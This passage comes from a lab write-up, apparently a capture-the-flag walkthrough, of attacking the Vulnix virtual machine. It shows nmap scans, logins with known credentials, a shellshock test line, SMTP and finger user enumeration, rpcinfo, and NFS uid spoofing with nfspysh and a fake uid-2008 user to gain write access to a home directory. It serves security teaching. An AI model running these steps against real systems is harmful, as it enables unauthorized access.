<span class="go">|   ssh-dss AAAAB3NzaC1kc3MAAACBAJJHCFDFkbuQTVpmQvCvdR2poQrsZOQ0nBEsUij15T9DAiUhxI41G8hQ97MM9Qe0eGdP7HsA8vkZnglainhktvPe1NN9+XnDVRziI3dEqSxpCi4obxxYdKtqGBIj83dOPpxm09xDhVYBdh7ZlZh8xttD+ACFqmN4VZjmv0IlSYZFAAAAFQC6Z+j+KbT59gBXSPQTpAJIh0FE2wAAAIEAgYwA5oFVMQdKfRwAxbLoADx3t735BpLIoVNX2j4UrAF8CmwLCmcsNAhdpUP+hMhKGXnP5co2nira3OkcwWRu219bjte7m1l9JOvCJUASTUzOC0CUJkm9wO40/gyJOelKRR37r0qnBImiEumL6dSpcg4b0IfozCI9UJGh/yiEu4kAAACASWk2tKCyCHamiXwIt0XdwTXubZYtRtH09LHdisSEsoinz+2szuzbqnwgancHXcyQ3PapixZhVNASZ8MobmkFDXh4SDS5zl+RW7K40FBh3z+HCdSAJJjkRFXWEuadjxpO2QWBYEJiER4AtFWUSl2kVMFdsWqYaK7BxStNNkmGBII=</span>
<span class="go">|   ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC1jCDgzdowLQVOEXrczN+xbuMcNkncz2EfCEncP7k8rhNjQq+eXzMKEfULxMLh/wLFhX2TVZDECTpQ0WVJckgkGeZSdvmEJKt5LbZlSm5HAz/DMUKIuohDRI4F3lqn9u5VAVKSyTXyR3EuxCsCHJy+Xf40BJImr+fZ7yH3xwPPqJ9in+LfgTXaRItqLDHiHAsTIXXwsDgweaS9hSTAR1MO+TdZCnXKPJ1NEt38+Fl7rnTnBE2TdtU3iyrlWXE0GGGg0bgldqas7bR4UH/uRZZOZK2+UTf0qg30H7ll8ShfZIbdW+59RfQqYz8tZYsoWoxahWf3dmx5soCWWcAP7DAV</span>
<span class="go">|_  ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGEudclsh1beHM/DPWQGR31dOGqdLcXVj1xLG/YSGfiNmN1pT6x0MwYQyN6pzCzzonljThH8JwIZjid+JN2PzxE=</span>
<span class="go">25/tcp   open  smtp</span>
<span class="go">79/tcp   open  finger</span>
<span class="go">110/tcp  open  pop3</span>
<span class="go">111/tcp  open  rpcbind</span>
<span class="go">143/tcp  open  imap</span>
<span class="go">512/tcp  open  exec</span>
<span class="go">513/tcp  open  login</span>
<span class="go">514/tcp  open  shell</span>
<span class="go">993/tcp  open  imaps</span>
<span class="go">995/tcp  open  pop3s</span>
<span class="go">2049/tcp open  nfs</span>

<span class="go">Nmap done: 1 IP address (1 host up) scanned in 0.24 seconds</span>
<span class="gp">(vulnix)hacker@kali:~$ #</span> nmap <span class="nv">$IP</span> --script ssh-hostkey --script-args <span class="nv">ssh_hostkey</span><span class="o">=</span><span class="s1">&#39;visual bubble&#39;</span>
<span class="gp">(vulnix)hacker@kali:~$ #</span> nmap <span class="nv">$IP</span> --script ssh-hostkey --script-args <span class="nv">ssh_hostkey</span><span class="o">=</span>all
</pre></div>
</div>
</div>
<div class="section" id="tcp-services">
<h4>3.20.2.2.4. TCP services<a class="headerlink" href="#tcp-services" title="Permalink to this headline">¶</a></h4>
<p><code class="docutils literal"><span class="pre">enumerator</span></code> simply runs:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">$SUDO</span> nmap -Pn -T4 -sS -sV  <span class="nv">$IP</span>
</pre></div>
</div>
<p>resulting in:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">(vulnix)hacker@kali:~$ $</span>SUDO nmap -Pn -T4 -sS -sV  <span class="nv">$IP</span>

<span class="go">Starting Nmap 6.47 ( http://nmap.org ) at 2015-04-17 10:34 PDT</span>
<span class="go">Nmap scan report for 192.168.1.103</span>
<span class="go">Host is up (0.00030s latency).</span>
<span class="go">Not shown: 988 closed ports</span>
<span class="go">PORT     STATE SERVICE    VERSION</span>
<span class="go">22/tcp   open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)</span>
<span class="go">25/tcp   open  smtp       Postfix smtpd</span>
<span class="go">79/tcp   open  finger     Linux fingerd</span>
<span class="go">110/tcp  open  pop3       Dovecot pop3d</span>
<span class="go">111/tcp  open  rpcbind    2-4 (RPC #100000)</span>
<span class="go">143/tcp  open  imap       Dovecot imapd</span>
<span class="go">512/tcp  open  exec       netkit-rsh rexecd</span>
<span class="go">513/tcp  open  login?</span>
<span class="go">514/tcp  open  tcpwrapped</span>
<span class="go">993/tcp  open  ssl/imap   Dovecot imapd</span>
<span class="go">995/tcp  open  ssl/pop3   Dovecot pop3d</span>
<span class="go">2049/tcp open  nfs        2-4 (RPC #100003)</span>
<span class="go">MAC Address: 52:54:00:4B:A3:6C (QEMU Virtual NIC)</span>
<span class="go">Service Info: Host:  vulnix; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span>

<span class="go">Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .</span>
<span class="go">Nmap done: 1 IP address (1 host up) scanned in 28.83 seconds</span>
</pre></div>
</div>
</div>
<div class="section" id="udp-services">
<h4>3.20.2.2.5. UDP services<a class="headerlink" href="#udp-services" title="Permalink to this headline">¶</a></h4>
<p><code class="docutils literal"><span class="pre">enumerator</span></code> simply runs:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">$SUDO</span> nmap -Pn -T4 -sU -sV --open --top-ports <span class="m">10</span> <span class="nv">$IP</span>
</pre></div>
</div>
<p>resulting in:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">(vulnix)hacker@kali:~$ $</span>SUDO nmap -Pn -T4 -sU -sV --open --top-ports <span class="m">10</span> <span class="nv">$IP</span>

<span class="go">Starting Nmap 6.47 ( http://nmap.org ) at 2015-04-17 10:37 PDT</span>
<span class="go">Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .</span>
<span class="go">Nmap done: 1 IP address (1 host up) scanned in 4.77 seconds</span>
</pre></div>
</div>
<p>A more complete scan (dropping options “–open –top-ports 10”) yields the following:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">(vulnix)hacker@kali:~$ $</span>SUDO nmap -Pn -T4 -sU -sV  <span class="nv">$IP</span>

<span class="go">Starting Nmap 6.47 ( http://nmap.org ) at 2015-04-17 10:38 PDT</span>



<span class="go">Nmap scan report for 192.168.1.103</span>
<span class="go">Host is up (0.00049s latency).</span>
<span class="go">Not shown: 953 closed ports, 45 open|filtered ports</span>
<span class="go">PORT     STATE SERVICE VERSION</span>
<span class="go">111/udp  open  rpcbind 2-4 (RPC #100000)</span>
<span class="go">2049/udp open  nfs     2-4 (RPC #100003)</span>
<span class="go">MAC Address: 52:54:00:4B:A3:6C (QEMU Virtual NIC)</span>

<span class="go">Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .</span>
<span class="go">Nmap done: 1 IP address (1 host up) scanned in 1226.03 seconds</span>
</pre></div>
</div>
</div>
</div>
<div class="section" id="more-reconnaissance">
<h3>3.20.2.3. More Reconnaissance<a class="headerlink" href="#more-reconnaissance" title="Permalink to this headline">¶</a></h3>
<p>Follow <a class="reference external" href="http://www.rebootuser.com/?page_id=1721">Rebootuser - Local Linux Enumeration &amp; Privilege Escalation</a> for hints at more reconnaissance. This section takes liberal advantage of the user/letmein account for on-server reconnaissance.</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># using &quot;sshpass -p&quot; is insecure but we do it in our playground</span>
<span class="nv">$SUDO</span> apt-get install sshpass -y
<span class="nv">IP</span><span class="o">=</span><span class="m">192</span>.168.1.103
sshpass -p <span class="s1">&#39;letmein&#39;</span> ssh user@<span class="nv">$IP</span>
</pre></div>
</div>
<div class="section" id="kernel-operating-system-device-information">
<h4>3.20.2.3.1. Kernel, Operating System &amp; Device Information<a class="headerlink" href="#kernel-operating-system-device-information" title="Permalink to this headline">¶</a></h4>
<p><code class="docutils literal"><span class="pre">uname</span> <span class="pre">-a</span></code> shows an old (2012-07-27) kernel version indicating the system is likely unpatched. Looking in <code class="file docutils literal"><span class="pre">/var/log/apt</span></code> we see</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">user@vulnix:~$</span> ls -l /var/log/apt/
<span class="go">total 24</span>
<span class="go">-rw-r--r-- 1 root root 12109 Sep  2  2012 history.log</span>
<span class="go">-rw-r--r-- 1 root adm   8797 Sep  2  2012 term.log</span>
<span class="gp">user@vulnix:~$</span> cat /var/log/apt/history.log
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="gp">user@vulnix:~$ #</span> history.log shows that no patches after <span class="m">2012</span>-09-02
</pre></div>
</div>
<p>So there’s no patches since 2012-09-02 meaning Vulnix is vulnerable to a host of bugs; one outstanding example is the shellshock bug.</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">user@vulnix:~$</span> env <span class="nv">x</span><span class="o">=</span><span class="s1">&#39;() { :;}; echo vulnerable&#39;</span> bash -c <span class="s1">&#39;echo hello&#39;</span>vulnerable
<span class="go">hello</span>
</pre></div>
</div>
<p>Unfortunately, to exploit the shellshock bug requires finding an application spawning bash that uses an environment variable as an argument.</p>
<p>To exploit one of the unpatched issues would require investigating:</p>
<ul class="simple">
<li><a class="reference external" href="http://www.ubuntu.com/usn/">Ubuntu security notices</a> for Ubuntu 12.04 LTS</li>
<li><a class="reference external" href="http://www.cvedetails.com/">CVS Details</a></li>
<li><a class="reference external" href="https://web.nvd.nist.gov/view/vuln/search">National Vulnerability Database</a></li>
</ul>
</div>
<div class="section" id="users-groups">
<h4>3.20.2.3.2. Users &amp; Groups<a class="headerlink" href="#users-groups" title="Permalink to this headline">¶</a></h4>
<p>A quick check of users shows only root is a super user and only normal accounts user and vulnix exist:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span>user@vulnix:~$ <span class="c1"># see that only non-system user accounts are &quot;user&quot; (id 1000) and &quot;vulnix&quot; (id 2008)</span>
user@vulnix:~$ <span class="k">for</span> i in <span class="k">$(</span>cat /etc/passwd <span class="m">2</span>&gt;/dev/null <span class="p">|</span> cut -d: -f1 <span class="m">2</span>&gt;/dev/null<span class="k">)</span><span class="p">;</span> <span class="k">do</span>
&gt;   <span class="k">if</span> <span class="o">[[</span> <span class="k">$(</span>id -u <span class="nv">$i</span><span class="k">)</span> -gt <span class="m">999</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
&gt;     <span class="nb">echo</span> <span class="s2">&quot;</span><span class="nv">$i</span><span class="s2"> </span><span class="k">$(</span>id -u <span class="nv">$i</span><span class="k">)</span><span class="s2">&quot;</span><span class="p">;</span>
&gt;   <span class="k">fi</span><span class="p">;</span>
&gt; <span class="k">done</span>
nobody <span class="m">65534</span>
user <span class="m">1000</span>
vulnix <span class="m">2008</span>
user@vulnix:~$ <span class="c1"># see only super user account is root</span>
user@vulnix:~$ grep -v -E <span class="s2">&quot;^#&quot;</span> /etc/passwd <span class="p">|</span> awk -F: <span class="s1">&#39;$3 == 0 { print $1}&#39;</span>
root
</pre></div>
</div>
<p>If there were no local access to Vulnix then smtp and finger could provide brute-force enumeration of users from Kali:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$ #</span> use smtp VRFY <span class="nb">command</span> to check <span class="k">for</span> users
<span class="gp">hacker@kali:~$ telnet $</span>IP <span class="m">25</span>
<span class="go">Trying 192.168.1.105...</span>
<span class="go">Connected to 192.168.1.105.</span>
<span class="go">Escape character is &#39;^]&#39;.</span>
<span class="go">220 vulnix ESMTP Postfix (Ubuntu)</span>
<span class="go">EHLO bitbender.org</span>
<span class="go">250-vulnix</span>
<span class="go">250-PIPELINING</span>
<span class="go">250-SIZE 10240000</span>
<span class="go">250-VRFY</span>
<span class="go">250-ETRN</span>
<span class="go">250-STARTTLS</span>
<span class="go">250-ENHANCEDSTATUSCODES</span>
<span class="go">250-8BITMIME</span>
<span class="go">250 DSN</span>
<span class="go">VRFY user</span>
<span class="go">252 2.0.0 user</span>
<span class="go">VRFY vulnix</span>
<span class="go">252 2.0.0 vulnix</span>
<span class="go">VRFY XXXXXXXXXXXX</span>
<span class="go">550 5.1.1 &lt;XXXXXXXXXXXX&gt;: Recipient address rejected: User unknown in local recipient table</span>
<span class="go">QUIT</span>
<span class="go">221 2.0.0 Bye</span>
<span class="go">Connection closed by foreign host.</span>

<span class="gp">hacker@kali:~$ #</span> use smtp-user-enum to check <span class="k">for</span> users
<span class="gp">hacker@kali:~$</span> cat &gt; users.txt <span class="s">&lt;&lt;EOF</span>
<span class="gp">&gt;</span><span class="s"> user</span>
<span class="gp">&gt;</span><span class="s"> vulnix</span>
<span class="gp">&gt;</span><span class="s"> XXXXXXXXXXXX</span>
<span class="gp">&gt;</span><span class="s"> EOF</span>
<span class="gp">hacker@kali:~$</span> smtp-user-enum -U users.txt -t <span class="nv">$IP</span>
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="gp">#</span><span class="c1">####### Scan started at Sat Apr 18 11:01:54 2015 #########</span>
<span class="go">192.168.1.103: user exists</span>
<span class="go">192.168.1.103: vulnix exists</span>
<span class="gp">#</span><span class="c1">####### Scan completed at Sat Apr 18 11:01:55 2015 #########</span>
<span class="go">2 results.</span>

<span class="go">3 queries in 1 seconds (3.0 queries / sec)</span>

<span class="gp">hacker@kali:~$ #</span> install finger to check <span class="k">for</span> users
<span class="gp">hacker@kali:~$ $</span>SUDO apt-get install finger -y
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="gp">hacker@kali:~$</span> finger user@<span class="nv">$IP</span>
<span class="go">Login: user                                   Name: user</span>
<span class="go">Directory: /home/user                 Shell: /bin/bash</span>
<span class="go">On since Sat Apr 18 18:39 (BST) on pts/0 from 192.168.1.104</span>
<span class="go">Last login Sat Apr 18 18:51 (BST) on pts/1 from 192.168.1.104</span>
<span class="go">No mail.</span>
<span class="go">No Plan.</span>

<span class="go">Login: dovenull                               Name: Dovecot login user</span>
<span class="go">Directory: /nonexistent               Shell: /bin/false</span>
<span class="go">Never logged in.</span>
<span class="go">No mail.</span>
<span class="go">No Plan.</span>
<span class="gp">hacker@kali:~$</span> finger vulnix@<span class="nv">$IP</span>
<span class="go">Login: vulnix                                 Name:</span>
<span class="go">Directory: /home/vulnix               Shell: /bin/bash</span>
<span class="go">Never logged in.</span>
<span class="go">No mail.</span>
<span class="go">No Plan.</span>
<span class="gp">hacker@kali:~$</span> finger XXXXXXXXXXXX@<span class="nv">$IP</span>
<span class="go">finger: XXXXXXXXXXXX: no such user.</span>
<span class="gp">hacker@kali:~$ $</span>SUDO apt-get remove finger -y
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
</pre></div>
</div>
</div>
<div class="section" id="rpcinfo">
<h4>3.20.2.3.3. <code class="docutils literal"><span class="pre">rpcinfo</span></code><a class="headerlink" href="#rpcinfo" title="Permalink to this headline">¶</a></h4>
<p>Run <code class="docutils literal"><span class="pre">rpcinfo</span></code> to determine the portmapped ports (bascially nfs = status, nfs, nlockmgr, and mountd):</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> rpcinfo -p <span class="nv">$IP</span>
<span class="go">   program vers proto   port</span>
<span class="go">    100000    4   tcp    111  portmapper</span>
<span class="go">    100000    3   tcp    111  portmapper</span>
<span class="go">    100000    2   tcp    111  portmapper</span>
<span class="go">    100000    4   udp    111  portmapper</span>
<span class="go">    100000    3   udp    111  portmapper</span>
<span class="go">    100000    2   udp    111  portmapper</span>
<span class="go">    100024    1   udp  48774  status</span>
<span class="go">    100024    1   tcp  40613  status</span>
<span class="go">    100003    2   tcp   2049  nfs</span>
<span class="go">    100003    3   tcp   2049  nfs</span>
<span class="go">    100003    4   tcp   2049  nfs</span>
<span class="go">    100227    2   tcp   2049</span>
<span class="go">    100227    3   tcp   2049</span>
<span class="go">    100003    2   udp   2049  nfs</span>
<span class="go">    100003    3   udp   2049  nfs</span>
<span class="go">    100003    4   udp   2049  nfs</span>
<span class="go">    100227    2   udp   2049</span>
<span class="go">    100227    3   udp   2049</span>
<span class="go">    100021    1   udp  45130  nlockmgr</span>
<span class="go">    100021    3   udp  45130  nlockmgr</span>
<span class="go">    100021    4   udp  45130  nlockmgr</span>
<span class="go">    100021    1   tcp  47065  nlockmgr</span>
<span class="go">    100021    3   tcp  47065  nlockmgr</span>
<span class="go">    100021    4   tcp  47065  nlockmgr</span>
<span class="go">    100005    1   udp  57240  mountd</span>
<span class="go">    100005    1   tcp  56240  mountd</span>
<span class="go">    100005    2   udp  37452  mountd</span>
<span class="go">    100005    2   tcp  56001  mountd</span>
<span class="go">    100005    3   udp  35932  mountd</span>
<span class="go">    100005    3   tcp  37852  mountd</span>
</pre></div>
</div>
</div>
</div>
<div class="section" id="an-embarrassment-of-riches">
<h3>3.20.2.4. An embarrassment of riches?<a class="headerlink" href="#an-embarrassment-of-riches" title="Permalink to this headline">¶</a></h3>
<p>There are many services to investigate for vulnerabilities: NFS open mount for user vulnix; ssh userid/password user/letmein (which allows us to do on-server reconnaissance); services ssh, smtp, finger, pop3, rpcbind, imap, rexec, and login. It turns out the keys are NFS &amp; ssh (or rexec/login). While in principle smtp &amp; finger could be used to do a brute force enumeration of users, having the user/letmein account made those superflous. We did not investigate pop3/imap as it was not needed.</p>
</div>
</div>
<div class="section" id="attacking-nfs">
<h2>3.20.3. Attacking NFS<a class="headerlink" href="#attacking-nfs" title="Permalink to this headline">¶</a></h2>
<p>We’ll start in the order of the reconnaissance output with attacking NFS. <code class="docutils literal"><span class="pre">enumerator</span></code> or <code class="docutils literal"><span class="pre">/sbin/showmount</span> <span class="pre">-e</span> <span class="pre">$IP</span></code> shows <code class="file docutils literal"><span class="pre">/home/vulnix</span></code> exported to ‘*’. This allows writing to /home/vulnix from Kali linux which we’ll exploit to get password-less access to Vulnix. There are these attack choices:</p>
<ul class="simple">
<li>Writing to NFS:<ul>
<li><code class="docutils literal"><span class="pre">nfspysh</span></code> - use the special tool <code class="docutils literal"><span class="pre">nfspysh</span></code></li>
<li><code class="docutils literal"><span class="pre">mount.nfs</span></code> - mount the nfs file system the normal nfs way</li>
</ul>
</li>
<li>Executing on Vulnix:<ul>
<li><code class="docutils literal"><span class="pre">rsh</span></code> - execute using the real <code class="docutils literal"><span class="pre">rsh</span></code> (not installed by default on Kali Linux)</li>
<li><code class="docutils literal"><span class="pre">ssh</span></code> - execute via <code class="docutils literal"><span class="pre">ssh</span></code></li>
</ul>
</li>
</ul>
<p>Using <code class="docutils literal"><span class="pre">nfspysh</span></code> &amp; <code class="docutils literal"><span class="pre">rsh</span></code> is easier than using <code class="docutils literal"><span class="pre">mount.nfs</span></code> &amp; <code class="docutils literal"><span class="pre">ssh</span></code>.</p>
<div class="section" id="reviewing-nfs-mounts">
<h3>3.20.3.1. Reviewing nfs mounts<a class="headerlink" href="#reviewing-nfs-mounts" title="Permalink to this headline">¶</a></h3>
<p>We begin with a review of how to mount nfs. Vulnix runs nfs4 which is backwards compatible with nfs3 clients. If the following is not clear you might consult <a class="reference external" href="https://help.ubuntu.com/community/NFSv4Howto">NFSv4Howto</a> and/or <a class="reference external" href="https://we.riseup.net/stefani/kerberos-and-nfs4">Kerberos and nfs4</a>.</p>
<div class="section" id="authentication">
<h4>3.20.3.1.1. Authentication<a class="headerlink" href="#authentication" title="Permalink to this headline">¶</a></h4>
<p>nfs4 can use kerberos but vulnix doesn not and so user identity must resort to unix uid/gid. nfs4 defaults to nobody/nogroup (4294967294/4294967294) for a failure to map a user and in fact you’ll always see the nobody/nogroup in directory listings even when nfs4 does allow access. However, nfs3 mounts will show the uid/gid for users not mapped to nobody/nogroup. So if uid/gid = 2008/2008 owns the files then creating a user with uid/gid on your local Kali box will get you access like the file owner.</p>
</div>
<div class="section" id="using-nfspysh">
<h4>3.20.3.1.2. Using <strong class="program">nfspysh</strong><a class="headerlink" href="#using-nfspysh" title="Permalink to this headline">¶</a></h4>
<p>From <a class="reference external" href="https://github.com/bonsaiviking/NfSpy/blob/master/README.md">NfSpy - an ID-spoofing NFS client</a>:</p>
<blockquote>
<div><p>NfSpy is a Python library for automating the falsification of NFS credentials when mounting an NFS share. Included are two client programs:</p>
<blockquote>
<div><p>nfspy uses the Filesystem in Userspace (FUSE) library to mount an NFS share in Linux. This allows the use of any regular file-searching and manipulation programs like grep and find to explore the NFS export.</p>
<p>nfspysh is a ftp-like interactive shell for exploring NFS exports. It does not require the FUSE library, so it can run on non-Linux platforms.</p>
</div></blockquote>
<p>NFS before version 4 is reliant upon host trust relationships for authentication. The NFS server trusts any client machines to authenticate users and assign the same user IDs (UIDS) that the shared filesystem uses. This works in NIS, NIS+, and LDAP domains, for instance, but only if you know the client machine is not compromised, or faking its identity. This is because the only authentication in the NFS protocol is the passing of the UID and GID (group ID). There are a few things that can be done to enhance the security of NFS, but many of them are incomplete solutions, and even with all three listed here, it could still be possible to circumvent the security measures.</p>
</div></blockquote>
<p>Since NfSpy spoofs the uid/gid, its simplest to use and immediately gives us the vulnix server’s uid/gid used for <code class="file docutils literal"><span class="pre">/home/vulnix</span></code> and write access:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">$SUDO</span> nfspysh -o <span class="nv">server</span><span class="o">=</span><span class="nv">$T</span>:/home/vulnix -c ls
<span class="nb">echo</span> hello &gt; hello.txt
<span class="nv">$SUDO</span> nfspysh -o <span class="nv">server</span><span class="o">=</span><span class="nv">$T</span>:/home/vulnix -c <span class="s1">&#39;put hello.txt&#39;</span>
<span class="nv">$SUDO</span> nfspysh -o <span class="nv">server</span><span class="o">=</span><span class="nv">$T</span>:/home/vulnix -c <span class="s1">&#39;chmod 600 hello.txt&#39;</span>
<span class="nv">$SUDO</span> nfspysh -o <span class="nv">server</span><span class="o">=</span><span class="nv">$T</span>:/home/vulnix -c ls
<span class="nv">$SUDO</span> nfspysh -o <span class="nv">server</span><span class="o">=</span><span class="nv">$T</span>:/home/vulnix -c <span class="s1">&#39;rm hello.txt&#39;</span>
</pre></div>
</div>
<p>Running this shows that <strong class="program">nfspysh</strong> show spoofing the correct uid/gid to get write access (even though the correct uid/gid is never specified):</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/local/pentest/phouse/vulnix$ $</span>SUDO nfspysh -o <span class="nv">server</span><span class="o">=</span><span class="nv">$T</span>:/home/vulnix -c ls
<span class="go">/:</span>
<span class="go">040750   2008   2008        4096 2015-04-30 00:13:31 .</span>
<span class="go">100644   2008   2008         220 2012-04-03 08:58:14 .bash_logout</span>
<span class="go">100644   2008   2008         675 2012-04-03 08:58:14 .profile</span>
<span class="go">040750   2008   2008        4096 2015-04-30 00:13:31 ..</span>
<span class="go">100644   2008   2008        3486 2012-04-03 08:58:14 .bashrc</span>
<span class="gp">hacker@kali:~/local/pentest/phouse/vulnix$</span> <span class="nb">echo</span> hello &gt; hello.txt
<span class="gp">hacker@kali:~/local/pentest/phouse/vulnix$ $</span>SUDO nfspysh -o <span class="nv">server</span><span class="o">=</span><span class="nv">$T</span>:/home/vulnix -c <span class="s1">&#39;put hello.txt&#39;</span>
<span class="gp">hacker@kali:~/local/pentest/phouse/vulnix$ $</span>SUDO nfspysh -o <span class="nv">server</span><span class="o">=</span><span class="nv">$T</span>:/home/vulnix -c <span class="s1">&#39;chmod 600 hello.txt&#39;</span>
<span class="gp">hacker@kali:~/local/pentest/phouse/vulnix$ $</span>SUDO nfspysh -o <span class="nv">server</span><span class="o">=</span><span class="nv">$T</span>:/home/vulnix -c ls
<span class="go">/:</span>
<span class="go">040750   2008   2008        4096 2015-04-30 00:14:44 .</span>
<span class="go">100644   2008   2008         220 2012-04-03 08:58:14 .bash_logout</span>
<span class="go">100600   2008   2008           6 2015-04-30 00:14:44 hello.txt</span>
<span class="go">100644   2008   2008         675 2012-04-03 08:58:14 .profile</span>
<span class="go">040750   2008   2008        4096 2015-04-30 00:14:44 ..</span>
<span class="go">100644   2008   2008        3486 2012-04-03 08:58:14 .bashrc</span>
<span class="gp">hacker@kali:~/local/pentest/phouse/vulnix$ $</span>SUDO nfspysh -o <span class="nv">server</span><span class="o">=</span><span class="nv">$T</span>:/home/vulnix -c <span class="s1">&#39;rm hello.txt&#39;</span>
</pre></div>
</div>
</div>
<div class="section" id="mounting-nfs4-style">
<h4>3.20.3.1.3. Mounting nfs4 style<a class="headerlink" href="#mounting-nfs4-style" title="Permalink to this headline">¶</a></h4>
<p>By contrast doing an nfs mount to get write access requires creating a user with the proper uid/gid. Here we use both an nfs4 and nfs3 mount to show the nfs4 always shows nobody/nogroup though it can give write access, but nfs3 mounts show the proper uid/gid.</p>
<p>Here is an nfs4 mount showing write access with a freshly-created user with uid/gid 2008/2008:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">SUDO</span><span class="o">=</span><span class="k">$(</span>which sudo<span class="k">)</span>
<span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s2">&quot;root&quot;</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">SUDO</span><span class="o">=</span>
<span class="c1"># nfs4 mounts at root</span>
<span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.103
<span class="nv">MP</span><span class="o">=</span>/mnt
<span class="nv">$SUDO</span> mount -t nfs4 <span class="nv">$T</span>:/ <span class="nv">$MP</span>
<span class="c1"># normal user fails to get access</span>
ls -laR <span class="nv">$MP</span>
<span class="c1"># but uid/gid 2008/2008 does get access</span>
<span class="nv">$SUDO</span> groupadd --gid <span class="m">2008</span> vulnix
<span class="nv">$SUDO</span> useradd -m vulnix --uid <span class="m">2008</span> --gid <span class="m">2008</span>
<span class="nv">$SUDO</span> passwd vulnix
<span class="c1"># set vulnix password</span>
<span class="nv">$SUDO</span> chsh -s /bin/bash vulnix
su - vulnix
ls -laR /mnt
<span class="c1"># and local vulnix user can write to the nfs share</span>
<span class="nb">echo</span> hello &gt; /mnt/home/vulnix/hello.txt
chmod <span class="m">600</span> /mnt/home/vulnix/hello.txt
ls -l /mnt/home/vulnix/hello.txt
</pre></div>
</div>
<p>Running this gives the following. Note that listing <code class="file docutils literal"><span class="pre">/home/vulnix</span></code> gets a permission denied. And note the uid/gid = 4294967294/4294967294</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/local/pentest/phouse/vulnix$ SUDO=$</span><span class="o">(</span>which sudo<span class="o">)</span>
<span class="gp">hacker@kali:~/local/pentest/phouse/vulnix$</span> <span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s2">&quot;root&quot;</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">SUDO</span><span class="o">=</span>
<span class="gp">hacker@kali:~/local/pentest/phouse/vulnix$ #</span> nfs4 mounts at root
<span class="gp">hacker@kali:~/local/pentest/phouse/vulnix$</span> <span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.103
<span class="gp">hacker@kali:~/local/pentest/phouse/vulnix$</span> <span class="nv">MP</span><span class="o">=</span>/mnt
<span class="gp">hacker@kali:~/local/pentest/phouse/vulnix$ $</span>SUDO mount -t nfs4 <span class="nv">$T</span>:/ <span class="nv">$MP</span>
<span class="gp">hacker@kali:~/local/pentest/phouse/vulnix$</span> ls -laR <span class="nv">$MP</span>
<span class="go">/mnt:</span>
<span class="go">total 12</span>
<span class="go">drwxr-xr-x 22 4294967294 4294967294 4096 Sep  2  2012 .</span>
<span class="go">drwxr-xr-x 25 root       root       4096 Apr 28 21:01 ..</span>
<span class="go">drwxr-xr-x  4 4294967294 4294967294 4096 Sep  2  2012 home</span>

<span class="go">/mnt/home:</span>
<span class="go">total 12</span>
<span class="go">drwxr-xr-x  4 4294967294 4294967294 4096 Sep  2  2012 .</span>
<span class="go">drwxr-xr-x 22 4294967294 4294967294 4096 Sep  2  2012 ..</span>
<span class="go">drwxr-x---  2 4294967294 4294967294 4096 Sep  2  2012 vulnix</span>
<span class="go">ls: cannot open directory /mnt/home/vulnix: Permission denied</span>
<span class="gp">hacker@kali:~/local/pentest/phouse/vulnix$ #</span> but uid/gid <span class="m">2008</span>/2008 does get access
<span class="gp">hacker@kali:~/local/pentest/phouse/vulnix$ $</span>SUDO groupadd --gid <span class="m">2008</span> vulnix
<span class="gp">hacker@kali:~/local/pentest/phouse/vulnix$ $</span>SUDO useradd -m vulnix --uid <span class="m">2008</span> --gid <span class="m">2008</span>
<span class="gp">hacker@kali:~/local/pentest/phouse/vulnix$ $</span>SUDO passwd vulnix
<span class="go">Enter new UNIX password:</span>
<span class="go">Retype new UNIX password:</span>
<span class="go">passwd: password updated successfully</span>
<span class="gp">hacker@kali:~/local/pentest/phouse/vulnix$ $</span>SUDO chsh -s /bin/bash vulnix
<span class="gp">hacker@kali:~/local/pentest/phouse/vulnix$</span> su - vulnix
<span class="go">Password:</span>
<span class="gp">vulnix@kali:~$</span> ls -laR /mnt
<span class="go">/mnt:</span>
<span class="go">total 12</span>
<span class="go">drwxr-xr-x 22 4294967294 4294967294 4096 Sep  2  2012 .</span>
<span class="go">drwxr-xr-x 25 root       root       4096 Apr 28 21:01 ..</span>
<span class="go">drwxr-xr-x  4 4294967294 4294967294 4096 Sep  2  2012 home</span>

<span class="go">/mnt/home:</span>
<span class="go">total 12</span>
<span class="go">drwxr-xr-x  4 4294967294 4294967294 4096 Sep  2  2012 .</span>
<span class="go">drwxr-xr-x 22 4294967294 4294967294 4096 Sep  2  2012 ..</span>
